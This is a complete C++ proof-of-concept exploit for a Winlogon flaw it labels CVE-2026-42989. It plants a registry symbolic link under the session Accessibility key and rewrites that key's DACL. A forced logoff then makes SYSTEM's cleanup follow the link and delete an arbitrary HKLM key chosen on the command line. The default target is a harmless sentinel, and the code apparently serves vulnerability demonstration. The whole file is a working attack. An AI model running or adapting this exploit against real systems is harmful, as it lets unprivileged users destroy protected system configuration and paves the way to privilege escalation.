// CVE-2026-42989 / SG-2026-0008
// Winlogon RegDeleteTreeW arbitrary HKLM key deletion via registry symbolic link.
// Entry: main(). Unicode-only. cl /std:c++17 poc.cpp advapi32.lib user32.lib

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <winternl.h>
#include <aclapi.h>
#include <sddl.h>
#include <cstdio>
#include <cwchar>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

static const wchar_t *kDefaultTargetNative = L"\\Registry\\Machine\\SOFTWARE\\SG_2026_0008_Target";
static const wchar_t *kSentinelWin32Sub = L"SOFTWARE\\SG_2026_0008_Target";
static const wchar_t *kAccessBase = L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility";
static const wchar_t *kStageName = L"Stage";
static const wchar_t *kLinkName = L"DeleteMe";
static const wchar_t *kSymbolicLinkValue = L"SymbolicLinkValue";

static const ULONG REG_OPTION_VOLATILE_X = 0x00000001;
static const ULONG REG_OPTION_CREATE_LINK_X = 0x00000002;
static const ULONG REG_LINK_TYPE = 6;
static const ULONG OBJ_CASE_INSENSITIVE_X = 0x00000040;

typedef NTSTATUS(NTAPI *NtCreateKey_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, ULONG, PUNICODE_STRING, ULONG, PULONG);
typedef NTSTATUS(NTAPI *NtSetValueKey_t)(HANDLE, PUNICODE_STRING, ULONG, ULONG, PVOID, ULONG);

static NtCreateKey_t g_NtCreateKey = nullptr;
static NtSetValueKey_t g_NtSetValueKey = nullptr;

static void InitUnicode(UNICODE_STRING *u, const wchar_t *s) {
    size_t len = wcslen(s) * sizeof(wchar_t);
    u->Length = (USHORT)len;
    u->MaximumLength = (USHORT)(len + sizeof(wchar_t));
    u->Buffer = (PWSTR)s;
}

static bool ResolveNtApis() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return false;
    g_NtCreateKey = (NtCreateKey_t)GetProcAddress(ntdll, "NtCreateKey");
    g_NtSetValueKey = (NtSetValueKey_t)GetProcAddress(ntdll, "NtSetValueKey");
    return g_NtCreateKey && g_NtSetValueKey;
}

static DWORD GetCurrentSessionId() {
    DWORD sessionId = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);
    return sessionId;
}

static PSID GetCurrentUserSid() {
    HANDLE token = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) return nullptr;
    DWORD len = 0;
    GetTokenInformation(token, TokenUser, nullptr, 0, &len);
    TOKEN_USER *tu = (TOKEN_USER *)LocalAlloc(LPTR, len);
    PSID copy = nullptr;
    if (tu && GetTokenInformation(token, TokenUser, tu, len, &len)) {
        DWORD sidLen = GetLengthSid(tu->User.Sid);
        copy = (PSID)LocalAlloc(LPTR, sidLen);
        if (copy) CopySid(sidLen, copy, tu->User.Sid);
    }
    if (tu) LocalFree(tu);
    CloseHandle(token);
    return copy;
}

static void SendAccessibilityHotkey() {
    INPUT in[6] = {};
    WORD keys[3] = {VK_CONTROL, VK_LWIN, VK_RETURN};
    for (int i = 0; i < 3; i++) {
        in[i].type = INPUT_KEYBOARD;
        in[i].ki.wVk = keys[i];
    }
    for (int i = 0; i < 3; i++) {
        in[3 + i].type = INPUT_KEYBOARD;
        in[3 + i].ki.wVk = keys[2 - i];
        in[3 + i].ki.dwFlags = KEYEVENTF_KEYUP;
    }
    SendInput(6, in, sizeof(INPUT));
}

static HKEY OpenSessionKey(const wchar_t *sessionPath) {
    HKEY hKey = nullptr;
    for (int attempt = 0; attempt < 6; attempt++) {
        LSTATUS s = RegOpenKeyExW(HKEY_LOCAL_MACHINE, sessionPath, 0, KEY_CREATE_SUB_KEY | READ_CONTROL, &hKey);
        if (s == ERROR_SUCCESS) {
            printf("[+]   session key opened (attempt %d)\n", attempt + 1);
            return hKey;
        }
        printf("[*]   session key not ready (err=%ld); nudging accessibility path\n", s);
        SendAccessibilityHotkey();
        Sleep(1500);
    }
    return nullptr;
}

static bool GrantSelfCreateLinkOnStage(HKEY hStage, PSID userSid) {
    BYTE systemSidBuf[SECURITY_MAX_SID_SIZE];
    PSID systemSid = (PSID)systemSidBuf;
    DWORD systemSidLen = sizeof(systemSidBuf);
    if (!CreateWellKnownSid(WinLocalSystemSid, nullptr, systemSid, &systemSidLen)) return false;

    EXPLICIT_ACCESSW ea[2] = {};
    ea[0].grfAccessPermissions = KEY_ALL_ACCESS;
    ea[0].grfAccessMode = SET_ACCESS;
    ea[0].grfInheritance = NO_INHERITANCE;
    ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea[0].Trustee.TrusteeType = TRUSTEE_IS_USER;
    ea[0].Trustee.ptstrName = (LPWSTR)userSid;

    ea[1].grfAccessPermissions = KEY_ALL_ACCESS;
    ea[1].grfAccessMode = SET_ACCESS;
    ea[1].grfInheritance = NO_INHERITANCE;
    ea[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea[1].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea[1].Trustee.ptstrName = (LPWSTR)systemSid;

    PACL newAcl = nullptr;
    if (SetEntriesInAclW(2, ea, nullptr, &newAcl) != ERROR_SUCCESS) return false;

    SECURITY_DESCRIPTOR sd = {};
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(&sd, TRUE, newAcl, FALSE);
    LSTATUS r = RegSetKeySecurity(hStage, DACL_SECURITY_INFORMATION, &sd);
    LocalFree(newAcl);
    return r == ERROR_SUCCESS;
}

static bool CreateLinkKey(HKEY hStageWithLink, const wchar_t *targetNative) {
    UNICODE_STRING uLinkName;
    InitUnicode(&uLinkName, kLinkName);

    OBJECT_ATTRIBUTES oa = {};
    oa.Length = sizeof(OBJECT_ATTRIBUTES);
    oa.RootDirectory = (HANDLE)hStageWithLink;
    oa.ObjectName = &uLinkName;
    oa.Attributes = OBJ_CASE_INSENSITIVE_X;

    HANDLE hLink = nullptr;
    ULONG disp = 0;
    NTSTATUS st = g_NtCreateKey(&hLink, KEY_ALL_ACCESS | KEY_CREATE_LINK, &oa, 0, nullptr,
                                REG_OPTION_CREATE_LINK_X | REG_OPTION_VOLATILE_X, &disp);
    if (st != 0) {
        printf("[-]   NtCreateKey(link) failed: 0x%08lX\n", (unsigned long)st);
        return false;
    }

    UNICODE_STRING uValueName;
    InitUnicode(&uValueName, kSymbolicLinkValue);
    ULONG dataSize = (ULONG)(wcslen(targetNative) * sizeof(wchar_t));
    NTSTATUS sv = g_NtSetValueKey(hLink, &uValueName, 0, REG_LINK_TYPE, (PVOID)targetNative, dataSize);
    CloseHandle(hLink);
    if (sv != 0) {
        printf("[-]   NtSetValueKey(SymbolicLinkValue) failed: 0x%08lX\n", (unsigned long)sv);
        return false;
    }
    return true;
}

static void MaybeCreateSentinel() {
    HKEY hKey = nullptr;
    LSTATUS s = RegCreateKeyExW(HKEY_LOCAL_MACHINE, kSentinelWin32Sub, 0, nullptr, 0, KEY_WRITE, nullptr, &hKey, nullptr);
    if (s == ERROR_SUCCESS) {
        DWORD marker = 0x42989;
        RegSetValueExW(hKey, L"marker", 0, REG_DWORD, (const BYTE *)&marker, sizeof(marker));
        RegCloseKey(hKey);
        printf("[+]   sentinel created: HKLM\\%ls\n", kSentinelWin32Sub);
    } else {
        printf("[*]   sentinel not created (err=%ld); create HKLM\\%ls as admin first\n", s, kSentinelWin32Sub);
    }
}

int main(int argc, char **argv) {
    const wchar_t *targetNative = kDefaultTargetNative;
    bool createSentinel = false;
    bool doLogoff = false;
    bool checkOnly = false;

    static wchar_t targetBuf[512];
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--create-sentinel") == 0) createSentinel = true;
        else if (strcmp(argv[i], "--logoff") == 0) doLogoff = true;
        else if (strcmp(argv[i], "--check") == 0) checkOnly = true;
        else if (argv[i][0] != '-') {
            MultiByteToWideChar(CP_ACP, 0, argv[i], -1, targetBuf, 512);
            targetNative = targetBuf;
        }
    }

    printf("=== CVE-2026-42989 / SG-2026-0008 Winlogon Link-Following Deletion PoC ===\n");

    if (checkOnly) {
        HKEY hKey = nullptr;
        LSTATUS s = RegOpenKeyExW(HKEY_LOCAL_MACHINE, kSentinelWin32Sub, 0, KEY_READ, &hKey);
        if (s == ERROR_FILE_NOT_FOUND) printf("[+]   sentinel GONE -> SYSTEM followed the link\n");
        else if (s == ERROR_SUCCESS) { RegCloseKey(hKey); printf("[*]   sentinel still present\n"); }
        else printf("[*]   sentinel open err=%ld\n", s);
        return 0;
    }

    if (!ResolveNtApis()) { printf("[-] failed to resolve NtCreateKey/NtSetValueKey\n"); return 1; }

    DWORD sessionId = GetCurrentSessionId();
    wchar_t sessionPath[512];
    swprintf(sessionPath, 512, L"%ls\\Session%u", kAccessBase, sessionId);
    printf("[+] session id = %u\n", sessionId);
    wprintf(L"[+] link target = %ls\n", targetNative);

    PSID userSid = GetCurrentUserSid();
    if (!userSid) { printf("[-] failed to obtain current user SID\n"); return 1; }

    if (createSentinel) { printf("[+] creating sentinel\n"); MaybeCreateSentinel(); }

    printf("[+] obtaining session accessibility key\n");
    HKEY hSession = OpenSessionKey(sessionPath);
    if (!hSession) {
        printf("[-] could not obtain session key. Trigger an accessibility path (Ctrl+Win+Enter / Win+U) in this interactive session and retry.\n");
        return 1;
    }

    printf("[+] creating VOLATILE child key '%ls'\n", kStageName);
    HKEY hStage = nullptr;
    LSTATUS cs = RegCreateKeyExW(hSession, kStageName, 0, nullptr, REG_OPTION_VOLATILE_X, READ_CONTROL, nullptr, &hStage, nullptr);
    if (cs != ERROR_SUCCESS) { printf("[-] RegCreateKeyExW(Stage) failed: %ld\n", cs); RegCloseKey(hSession); return 1; }
    RegCloseKey(hStage);

    wchar_t stagePath[600];
    swprintf(stagePath, 600, L"%ls\\%ls", sessionPath, kStageName);
    printf("[+] rewriting owned Stage DACL to grant self KEY_CREATE_LINK\n");
    HKEY hStageWd = nullptr;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, stagePath, 0, WRITE_DAC | READ_CONTROL, &hStageWd) != ERROR_SUCCESS) {
        printf("[-] cannot open Stage with WRITE_DAC\n"); RegCloseKey(hSession); return 1;
    }
    if (!GrantSelfCreateLinkOnStage(hStageWd, userSid)) { printf("[-] failed to set Stage DACL\n"); RegCloseKey(hStageWd); RegCloseKey(hSession); return 1; }
    RegCloseKey(hStageWd);

    printf("[+] planting symbolic link %ls\\%ls -> target\n", kStageName, kLinkName);
    HKEY hStageLink = nullptr;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, stagePath, 0, KEY_CREATE_LINK | KEY_CREATE_SUB_KEY, &hStageLink) != ERROR_SUCCESS) {
        printf("[-] cannot reopen Stage with KEY_CREATE_LINK\n"); RegCloseKey(hSession); return 1;
    }
    bool linked = CreateLinkKey(hStageLink, targetNative);
    RegCloseKey(hStageLink);
    RegCloseKey(hSession);
    if (!linked) { printf("[-] failed to plant symbolic link key\n"); return 1; }
    printf("[+] symbolic link key planted\n");

    printf("[+] trigger SYSTEM cleanup (WlAccessibilitypDeleteSATKey)\n");
    if (doLogoff) {
        printf("[+] calling ExitWindowsEx(EWX_LOGOFF); SYSTEM will RegDeleteTreeW the session tree\n");
        if (!ExitWindowsEx(EWX_LOGOFF | EWX_FORCE, SHTDN_REASON_FLAG_PLANNED)) printf("[-] ExitWindowsEx failed: %lu\n", GetLastError());
    } else {
        printf("[*] --logoff not set; log off (or end this session) to fire the delete, then re-run with --check.\n");
    }

    LocalFree(userSid);
    printf("[+] Done.\n");
    return 0;
}
